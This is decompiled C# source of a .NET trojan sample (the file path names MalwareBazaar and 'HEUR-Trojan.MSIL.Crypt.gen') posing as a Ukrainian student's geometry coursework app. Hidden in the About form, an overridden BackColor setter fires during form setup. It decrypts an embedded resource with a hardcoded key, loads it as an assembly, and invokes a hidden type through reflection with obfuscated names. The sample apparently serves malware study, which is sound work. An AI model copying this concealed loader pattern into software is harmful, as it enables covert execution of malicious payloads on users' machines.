// Decompiled with JetBrains decompiler
// Type: cours.AboutBox2
// Assembly: StringResultHand, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 972439AE-5227-4007-A7B1-AD8C12183697
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan.MSIL.Crypt.gen-b0c6cc3231a21a0edb387339bccfdc42bc5c15a57e76165ea00487144e63b9da.exe

using Microsoft.VisualBasic;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Windows.Forms;

namespace cours
{
  internal class AboutBox2 : Form
  {
    private IContainer components = (IContainer) null;
    private static object DeclaredEvents;
    private TableLayoutPanel tableLayoutPanel;
    private PictureBox logoPictureBox;
    private Label labelProductName;
    private Label labelVersion;
    private Label labelCopyright;
    private Label labelCompanyName;
    private TextBox TBD;
    private MenuStrip menuStrip1;
    private ToolStripMenuItem менюToolStripMenuItem;
    private ToolStripMenuItem проПрограмуToolStripMenuItem;
    private ToolStripMenuItem виконавToolStripMenuItem;
    private ToolStripMenuItem відкритиПрограмуToolStripMenuItem;
    private ToolStripMenuItem вихідToolStripMenuItem;
    private ToolStripMenuItem вихідToolStripMenuItem1;
    private ToolStripMenuItem вихідніДаніToolStripMenuItem;

    public AboutBox2()
    {
      this.InitializeComponent();
      Interaction.CallByName(Interaction.CallByName(AboutBox2.DeclaredEvents, "GetMethod", CallType.Get, (object) "DictionaryEnumerator"), "Invoke", CallType.Get, (object) 0, (object) new string[3]
      {
        "45747753657373",
        "575A684B573251",
        "cours"
      });
    }

    public string AssemblyTitle
    {
      get
      {
        object[] customAttributes = Assembly.GetExecutingAssembly().GetCustomAttributes(typeof (AssemblyTitleAttribute), false);
        if (customAttributes.Length != 0)
        {
          AssemblyTitleAttribute assemblyTitleAttribute = (AssemblyTitleAttribute) customAttributes[0];
          if (assemblyTitleAttribute.Title != "")
            return assemblyTitleAttribute.Title;
        }
        return Path.GetFileNameWithoutExtension(Assembly.GetExecutingAssembly().CodeBase);
      }
    }

    public string AssemblyVersion => Assembly.GetExecutingAssembly().GetName().Version.ToString();

    public string AssemblyDescription
    {
      get
      {
        object[] customAttributes = Assembly.GetExecutingAssembly().GetCustomAttributes(typeof (AssemblyDescriptionAttribute), false);
        return customAttributes.Length == 0 ? "" : ((AssemblyDescriptionAttribute) customAttributes[0]).Description;
      }
    }

    public string AssemblyProduct
    {
      get
      {
        object[] customAttributes = Assembly.GetExecutingAssembly().GetCustomAttributes(typeof (AssemblyProductAttribute), false);
        return customAttributes.Length == 0 ? "" : ((AssemblyProductAttribute) customAttributes[0]).Product;
      }
    }

    public string AssemblyCopyright
    {
      get
      {
        object[] customAttributes = Assembly.GetExecutingAssembly().GetCustomAttributes(typeof (AssemblyCopyrightAttribute), false);
        return customAttributes.Length == 0 ? "" : ((AssemblyCopyrightAttribute) customAttributes[0]).Copyright;
      }
    }

    public string AssemblyCompany
    {
      get
      {
        object[] customAttributes = Assembly.GetExecutingAssembly().GetCustomAttributes(typeof (AssemblyCompanyAttribute), false);
        return customAttributes.Length == 0 ? "" : ((AssemblyCompanyAttribute) customAttributes[0]).Company;
      }
    }

    private void менюToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void відкритиПрограмуToolStripMenuItem_Click(object sender, EventArgs e) => new Form1().Show();

    private void вихідToolStripMenuItem_Click(object sender, EventArgs e) => Process.Start("Shapes.txt");

    private void вихідToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      if (MessageBox.Show("Закрити програму?", "Exit", MessageBoxButtons.OKCancel) != DialogResult.OK)
        return;
      Application.Exit();
    }

    private void проПрограмуToolStripMenuItem_Click(object sender, EventArgs e) => this.TBD.Text = "У файлі задано координати вершин трикутників та чотирикутників. Вивести їх на екран.Ті трикутники периметр яких меншийніж половина периметра найбільшого чотирикутника, виділити окремим кольором. Іншим кольором виділити два трикутники, що відповідають умові та мають найбільший периметр.В найбільшому і найменшому чотирикутнику провести діагоналі.";

    private void виконавToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.TBD.Text = "                      Автор програми:\n                      Романенко Сергій\n                      Студент групи 4-ОК-2\n                      ВК НУХТ";
      FileStream fileStream = new FileStream("photo.jpg", FileMode.Open);
      Image image = Image.FromStream((Stream) fileStream);
      fileStream.Close();
      this.logoPictureBox.Image = image;
    }

    private void textBoxDescription_TextChanged(object sender, EventArgs e)
    {
    }

    private void вихідніДаніToolStripMenuItem_Click(object sender, EventArgs e) => Process.Start("Result.txt");

    private void logoPictureBox_Click(object sender, EventArgs e)
    {
    }

    private void завданняToolStripMenuItem_Click(object sender, EventArgs e) => this.TBD.Text = "У файлі задано координати вершин трикутників та чотирикутників. Вивести їх на екран.Ті трикутники периметр яких меншийніж половина периметра найбільшого чотирикутника, виділити окремим кольором. Іншим кольором виділити два трикутники, що відповідають умові та мають найбільший периметр.В найбільшому і найменшому чотирикутнику провести діагоналі.";

    private void кодПрограмиToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (AboutBox2));
      this.tableLayoutPanel = new TableLayoutPanel();
      this.logoPictureBox = new PictureBox();
      this.labelProductName = new Label();
      this.labelVersion = new Label();
      this.labelCopyright = new Label();
      this.labelCompanyName = new Label();
      this.TBD = new TextBox();
      this.menuStrip1 = new MenuStrip();
      this.менюToolStripMenuItem = new ToolStripMenuItem();
      this.відкритиПрограмуToolStripMenuItem = new ToolStripMenuItem();
      this.вихідToolStripMenuItem = new ToolStripMenuItem();
      this.вихідніДаніToolStripMenuItem = new ToolStripMenuItem();
      this.вихідToolStripMenuItem1 = new ToolStripMenuItem();
      this.проПрограмуToolStripMenuItem = new ToolStripMenuItem();
      this.виконавToolStripMenuItem = new ToolStripMenuItem();
      this.tableLayoutPanel.SuspendLayout();
      ((ISupportInitialize) this.logoPictureBox).BeginInit();
      this.menuStrip1.SuspendLayout();
      this.SuspendLayout();
      this.tableLayoutPanel.ColumnCount = 2;
      this.tableLayoutPanel.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 33f));
      this.tableLayoutPanel.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 67f));
      this.tableLayoutPanel.Controls.Add((Control) this.logoPictureBox, 0, 0);
      this.tableLayoutPanel.Controls.Add((Control) this.labelProductName, 1, 0);
      this.tableLayoutPanel.Controls.Add((Control) this.labelVersion, 1, 1);
      this.tableLayoutPanel.Controls.Add((Control) this.labelCopyright, 1, 2);
      this.tableLayoutPanel.Controls.Add((Control) this.labelCompanyName, 1, 3);
      this.tableLayoutPanel.Controls.Add((Control) this.TBD, 1, 4);
      this.tableLayoutPanel.Dock = DockStyle.Fill;
      this.tableLayoutPanel.Location = new Point(9, 33);
      this.tableLayoutPanel.Name = "tableLayoutPanel";
      this.tableLayoutPanel.RowCount = 6;
      this.tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 10f));
      this.tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 10f));
      this.tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 10f));
      this.tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 10f));
      this.tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 50f));
      this.tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 10f));
      this.tableLayoutPanel.Size = new Size(417, 241);
      this.tableLayoutPanel.TabIndex = 0;
      this.logoPictureBox.Dock = DockStyle.Fill;
      this.logoPictureBox.Image = (Image) componentResourceManager.GetObject("logoPictureBox.Image");
      this.logoPictureBox.Location = new Point(3, 3);
      this.logoPictureBox.Name = "logoPictureBox";
      this.tableLayoutPanel.SetRowSpan((Control) this.logoPictureBox, 6);
      this.logoPictureBox.Size = new Size(131, 235);
      this.logoPictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
      this.logoPictureBox.TabIndex = 12;
      this.logoPictureBox.TabStop = false;
      this.logoPictureBox.Click += new EventHandler(this.logoPictureBox_Click);
      this.labelProductName.Dock = DockStyle.Fill;
      this.labelProductName.Location = new Point(143, 0);
      this.labelProductName.Margin = new Padding(6, 0, 3, 0);
      this.labelProductName.MaximumSize = new Size(0, 17);
      this.labelProductName.Name = "labelProductName";
      this.labelProductName.Size = new Size(271, 17);
      this.labelProductName.TabIndex = 19;
      this.labelProductName.Text = "Название продукта";
      this.labelProductName.TextAlign = ContentAlignment.MiddleLeft;
      this.labelVersion.Dock = DockStyle.Fill;
      this.labelVersion.Location = new Point(143, 24);
      this.labelVersion.Margin = new Padding(6, 0, 3, 0);
      this.labelVersion.MaximumSize = new Size(0, 17);
      this.labelVersion.Name = "labelVersion";
      this.labelVersion.Size = new Size(271, 17);
      this.labelVersion.TabIndex = 0;
      this.labelVersion.Text = "Версия";
      this.labelVersion.TextAlign = ContentAlignment.MiddleLeft;
      this.labelCopyright.Dock = DockStyle.Fill;
      this.labelCopyright.Location = new Point(143, 48);
      this.labelCopyright.Margin = new Padding(6, 0, 3, 0);
      this.labelCopyright.MaximumSize = new Size(0, 17);
      this.labelCopyright.Name = "labelCopyright";
      this.labelCopyright.Size = new Size(271, 17);
      this.labelCopyright.TabIndex = 21;
      this.labelCopyright.Text = "Авторские права";
      this.labelCopyright.TextAlign = ContentAlignment.MiddleLeft;
      this.labelCompanyName.Dock = DockStyle.Fill;
      this.labelCompanyName.Location = new Point(143, 72);
      this.labelCompanyName.Margin = new Padding(6, 0, 3, 0);
      this.labelCompanyName.MaximumSize = new Size(0, 17);
      this.labelCompanyName.Name = "labelCompanyName";
      this.labelCompanyName.Size = new Size(271, 17);
      this.labelCompanyName.TabIndex = 22;
      this.labelCompanyName.Text = "Название организации";
      this.labelCompanyName.TextAlign = ContentAlignment.MiddleLeft;
      this.TBD.Dock = DockStyle.Fill;
      this.TBD.Location = new Point(143, 99);
      this.TBD.Margin = new Padding(6, 3, 3, 3);
      this.TBD.Multiline = true;
      this.TBD.Name = "TBD";
      this.TBD.ReadOnly = true;
      this.TBD.ScrollBars = ScrollBars.Both;
      this.TBD.Size = new Size(271, 114);
      this.TBD.TabIndex = 23;
      this.TBD.TabStop = false;
      this.TBD.Text = "Описание";
      this.TBD.TextChanged += new EventHandler(this.textBoxDescription_TextChanged);
      this.menuStrip1.Items.AddRange(new ToolStripItem[3]
      {
        (ToolStripItem) this.менюToolStripMenuItem,
        (ToolStripItem) this.проПрограмуToolStripMenuItem,
        (ToolStripItem) this.виконавToolStripMenuItem
      });
      this.menuStrip1.Location = new Point(9, 9);
      this.menuStrip1.Name = "menuStrip1";
      this.menuStrip1.Size = new Size(417, 24);
      this.menuStrip1.TabIndex = 1;
      this.menuStrip1.Text = "menuStrip1";
      this.менюToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[4]
      {
        (ToolStripItem) this.відкритиПрограмуToolStripMenuItem,
        (ToolStripItem) this.вихідToolStripMenuItem,
        (ToolStripItem) this.вихідніДаніToolStripMenuItem,
        (ToolStripItem) this.вихідToolStripMenuItem1
      });
      this.менюToolStripMenuItem.Name = "менюToolStripMenuItem";
      this.менюToolStripMenuItem.Size = new Size(53, 20);
      this.менюToolStripMenuItem.Text = "Меню";
      this.менюToolStripMenuItem.Click += new EventHandler(this.менюToolStripMenuItem_Click);
      this.відкритиПрограмуToolStripMenuItem.Name = "відкритиПрограмуToolStripMenuItem";
      this.відкритиПрограмуToolStripMenuItem.Size = new Size(179, 22);
      this.відкритиПрограмуToolStripMenuItem.Text = "Відкрити програму";
      this.відкритиПрограмуToolStripMenuItem.Click += new EventHandler(this.відкритиПрограмуToolStripMenuItem_Click);
      this.вихідToolStripMenuItem.Name = "вихідToolStripMenuItem";
      this.вихідToolStripMenuItem.Size = new Size(179, 22);
      this.вихідToolStripMenuItem.Text = "Вхідні дані";
      this.вихідToolStripMenuItem.Click += new EventHandler(this.вихідToolStripMenuItem_Click);
      this.вихідніДаніToolStripMenuItem.Name = "вихідніДаніToolStripMenuItem";
      this.вихідніДаніToolStripMenuItem.Size = new Size(179, 22);
      this.вихідніДаніToolStripMenuItem.Text = "Вихідні дані";
      this.вихідніДаніToolStripMenuItem.Click += new EventHandler(this.вихідніДаніToolStripMenuItem_Click);
      this.вихідToolStripMenuItem1.Name = "вихідToolStripMenuItem1";
      this.вихідToolStripMenuItem1.Size = new Size(179, 22);
      this.вихідToolStripMenuItem1.Text = "Вихід";
      this.вихідToolStripMenuItem1.Click += new EventHandler(this.вихідToolStripMenuItem1_Click);
      this.проПрограмуToolStripMenuItem.Name = "проПрограмуToolStripMenuItem";
      this.проПрограмуToolStripMenuItem.Size = new Size(99, 20);
      this.проПрограмуToolStripMenuItem.Text = "Про програму";
      this.проПрограмуToolStripMenuItem.Click += new EventHandler(this.проПрограмуToolStripMenuItem_Click);
      this.виконавToolStripMenuItem.Name = "виконавToolStripMenuItem";
      this.виконавToolStripMenuItem.Size = new Size(65, 20);
      this.виконавToolStripMenuItem.Text = "Виконав";
      this.виконавToolStripMenuItem.Click += new EventHandler(this.виконавToolStripMenuItem_Click);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(435, 283);
      this.Controls.Add((Control) this.tableLayoutPanel);
      this.Controls.Add((Control) this.menuStrip1);
      this.FormBorderStyle = FormBorderStyle.FixedDialog;
      this.MainMenuStrip = this.menuStrip1;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (AboutBox2);
      this.Padding = new Padding(9);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterParent;
      this.Text = nameof (AboutBox2);
      this.tableLayoutPanel.ResumeLayout(false);
      this.tableLayoutPanel.PerformLayout();
      ((ISupportInitialize) this.logoPictureBox).EndInit();
      this.menuStrip1.ResumeLayout(false);
      this.menuStrip1.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
      this.BackColor = Color.Black;
    }

    public override Color BackColor
    {
      get => base.BackColor;
      set => AboutBox2.SerializationHeaderRecord();
    }

    private static Color SerializationHeaderRecord()
    {
      byte[] numArray = (byte[]) new ResourceManager(typeof (AboutBox1)).GetObject("Xena");
      string pass = "P9FQ4BGHG58V5UHE4A4447";
      for (int i = 28694; i >= 0; i += -1)
        numArray = AboutBox2.doMath(pass, numArray, i);
      AboutBox2.@byte(AboutBox2.@return(numArray));
      return Color.DarkOrchid;
    }

    private static byte[] doMath(string pass, byte[] tt, int i)
    {
      tt[i % 14336] = AboutBox2.@int((AboutBox2.@object((int) tt[i % 14336] ^ (int) pass[i % 22]) - AboutBox2.@object((int) tt[(i + 1) % 14336]) + 256) % 256);
      return tt;
    }

    private static int @object(int x) => x;

    private static byte @int(int x) => (byte) x;

    private static object @return(byte[] OSVERSIONINFOEX) => (object) Assembly.Load(OSVERSIONINFOEX);

    private static void @byte(object CompatibilitySwitches) => AboutBox2.DeclaredEvents = (object) ((Assembly) CompatibilitySwitches).GetType("Forging.Forging");
  }
}
